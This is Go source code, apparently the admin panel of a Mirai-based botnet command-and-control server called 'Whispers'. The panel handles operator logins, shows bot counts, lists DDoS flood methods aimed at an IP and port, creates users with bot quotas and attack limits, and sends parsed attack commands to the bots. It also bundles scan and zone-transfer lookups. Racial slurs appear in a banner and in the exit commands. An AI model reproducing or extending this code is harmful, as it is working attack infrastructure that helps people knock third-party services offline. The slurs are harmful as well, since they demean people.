package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
    
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[97mUsername\033[36m: \033[0m"))

    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[97mPassword\033[36m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[91;1mпроизошла неизвестная ошибка\r\n"))
        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("\033[90mCome speak words to niggas"))
    time.Sleep(3 * time.Second)
    for i := 0; i < 4; i++ {
        time.Sleep(350 * time.Millisecond)
    }
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Whispers: [%d] | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write(append([]byte("\r\033[39mConnecting To Terminal \033[1;36m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(200) * time.Millisecond)
    }
     this.conn.Write([]byte("\033[2J\033[1H")) //display main header
           this.conn.Write([]byte("\033[1;37mWelcome back \033[34m" + username + "\033[1;37m \r\n"))
           this.conn.Write([]byte("\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[1;37m" + username + "@\033[34mmirai\033[96m# \x1b[97m"))
        cmd, err := this.ReadLine(false)
        
        if err != nil || cmd == "cls" || cmd == "clear" || cmd == "CLEAR" || cmd == "CLS" || cmd == "Cls" || cmd == "Clear" || cmd == "C" || cmd == "c" {

    this.conn.Write([]byte("\033[2J\033[1;1H"))
            continue
        }
        if err != nil || cmd == "exit" || cmd == "Exit" || cmd == "byenigga" || cmd == "Bail" || cmd == "Dip" || cmd == "EXIT" || cmd == "BYENIGGA" || cmd == "BAIL" || cmd == "bail" || cmd == "dip" || cmd == "DIP" {
            return
        }
        
        if cmd == "" {
            continue
        }
        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" || cmd == "Help" || cmd == "Help Menu" || cmd == "HELP MENU" || cmd == "Help menu" || cmd == "helpmenu" || cmd == "HelpMenu" || cmd == "HELPMENY" {
            this.conn.Write([]byte("\033[39m╔═════════════════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Attack - \033[97mShows Attack Methods                                      \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Admin  - \033[97mShows Admin Commands                                      \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Rules  - \033[97mShows Rules                                               \033[39m║\033[0m\r\n"))     
            this.conn.Write([]byte("\033[39m║\033[36m      Server - \033[97mShows Serverside Commands                                 \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Tools  - \033[97mShows Awesome Tools                                       \033[39m║\033[0m\r\n"))        
            this.conn.Write([]byte("\033[39m╚═════════════════════════════════════════════════════════════════════════╝\r\n"))
            continue
        }
        if userInfo.admin == 1 && cmd == "Admin" || cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\033[39m╔═════════════════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Adduser    - \033[97mAdds A New User                                       \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Bots       - \033[97mShows Botcount                                        \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m╚═════════════════════════════════════════════════════════════════════════╝\r\n"))
            continue
        }
        if err != nil || cmd == "rules" || cmd == "RULES" || cmd == "Rules" {
            this.conn.Write([]byte("\033[39m╔═════════════════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m  Attacking Goverment Websites = \033[97mBan                                     \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m  Fucking Pointless Attacks    = \033[97mWarn Then Ban                           \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m  Spamming Attacks             = \033[97mBan                                     \033[39m║\033[0m\r\n"))          
            this.conn.Write([]byte("\033[39m║\033[36m  Sharing Login Info           = \033[97mBan                                     \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m╚═════════════════════════════════════════════════════════════════════════╝\r\n"))
            continue
        }
        if err != nil || cmd == "Server" || cmd == "SERVER" || cmd == "server" {
            this.conn.Write([]byte("\033[39m╔═════════════════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Exit   - \033[97mLog Out                                                   \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Cls    - \033[97mClears Screen                                             \033[39m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[39m║\033[36m      Help   - \033[97mOpens Main Menu                                           \033[39m║\033[0m\r\n"))           
            this.conn.Write([]byte("\033[39m╚═════════════════════════════════════════════════════════════════════════╝\r\n"))
            continue
        }
        if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "attack" || cmd == "attk" || cmd == "Attack" || cmd == "ATTK"|| cmd == "Attk" || cmd == "Method"|| cmd == "method"|| cmd == "METHOD" || cmd == "Attacks"|| cmd == "ATTACKS" || cmd == "Methods" || cmd == "attacks" {
            this.conn.Write([]byte("\033[34m╔══                                   ══╗\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37msynhex    \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mackhex    \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mxserhex   \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37movhdown   \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mnfodown   \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mhexxmas   \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mstdrhex   \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mppshex    \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mhandshake \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37mbypass    \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m║   \033[1;37msocket    \033[1;37m[\033[34mIP\033[1;37m] [TIME\033[1;37m] \033[1;37mdport=[\033[34mPORT\033[1;37m]\033[34m  ║\r\n"))
            this.conn.Write([]byte("\033[34m╚══                                   ══╝\r\n"))
            continue
        }

        if err != nil || cmd == "tools" || cmd == "Tools" || cmd == "TOOLS" || cmd == "tool" || cmd == "Tool" || cmd == "TOOL" {
            this.conn.Write([]byte("\033[37m╔═══════════════════════════════════╗\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m Ping         \033[90m- \033[0mPing an IPv4       \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m IPLookup     \033[90m- \033[0mLookup IPv4        \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m PortScan     \033[90m- \033[0mPortscan IPv4      \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m Resolve      \033[90m- \033[0mResolve a URL      \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m ReverseDNS   \033[90m- \033[0mFind DNS of an IPv4\033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m ASNLookup    \033[90m- \033[0mFind ASN of an IPv4\033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m TraceRoute   \033[90m- \033[0mTraceroute On IPv4 \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m SubnetCalc   \033[90m- \033[0mCalculate A Subnet \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m WhoIs        \033[90m- \033[0mWHOIS Search       \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m║\033[36m ZoneTransfer \033[90m- \033[0mShows ZT           \033[37m║\033[0m\r\n"))
            this.conn.Write([]byte("\033[37m╚═══════════════════════════════════╝\033[0m\r\n"))
            continue
        }

            if err != nil || cmd == "IPLOOKUP" || cmd == "iplookup" || cmd == "IPLookup" || cmd == "IpLookup" || cmd == "IPlookup" {
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResults\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

        if err != nil || cmd == "PORTSCAN" || cmd == "portscan" || cmd == "PortScan" || cmd == "Portscan" {                  
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResults\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

            if err != nil || cmd == "WHOIS" || cmd == "whois" || cmd == "WhoIs" || cmd == "Whois" {
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResults\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

            if err != nil || cmd == "PING" || cmd == "ping" || cmd == "Ping" {
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://check-host.net/check-ping?host=&max_nodes=3" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResponse\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

        if err != nil || cmd == "traceroute" || cmd == "TRACEROUTE" || cmd == "TraceRoute" || cmd == "Traceroute" {                  
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResults\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

        if err != nil || cmd == "resolve" || cmd == "RESOLVE" || cmd == "Resolve" {                  
            this.conn.Write([]byte("\033[1;33mURL (Without www.)\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResult\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

            if err != nil || cmd == "reversedns" || cmd == "REVERSEDNS" || cmd == "ReverseDNS" || cmd == "Reversedns" {
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResult\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

            if err != nil || cmd == "ASNlookup" || cmd == "asnlookup" || cmd == "ASNLOOKUP" || cmd == "ASNLookup" {
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResult\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

            if err != nil || cmd == "subnetcalc" || cmd == "SUBNETCALC" || cmd == "SubnetCalc" || cmd == "SubNetCalc" || cmd == "Subnetcalc" {
            this.conn.Write([]byte("\033[1;33mIPv4\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResult\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

            if err != nil || cmd == "zonetransfer" || cmd == "ZONETRANSFER" || cmd == "ZoneTransfer" || cmd == "Zonetransfer" {
            this.conn.Write([]byte("\033[1;33mIPv4 Or Website (Without www.)\033[1;36m: \033[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;33mResult\033[1;36m: \r\n\033[1;36m" + locformatted + "\033[0m\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (Y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        
        if cmd == "BOTS" || cmd == "bots" || cmd == "Bots" || cmd == "BotCount" || cmd == "Botcount"|| cmd == "botcount" || cmd == "botCount" || cmd == "b"|| cmd == "B" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;36m%s \033[0m[\033[1;36m%d\033[0m]\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[1;36mTotal \033[0m[\033[1;36m%d\033[0m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
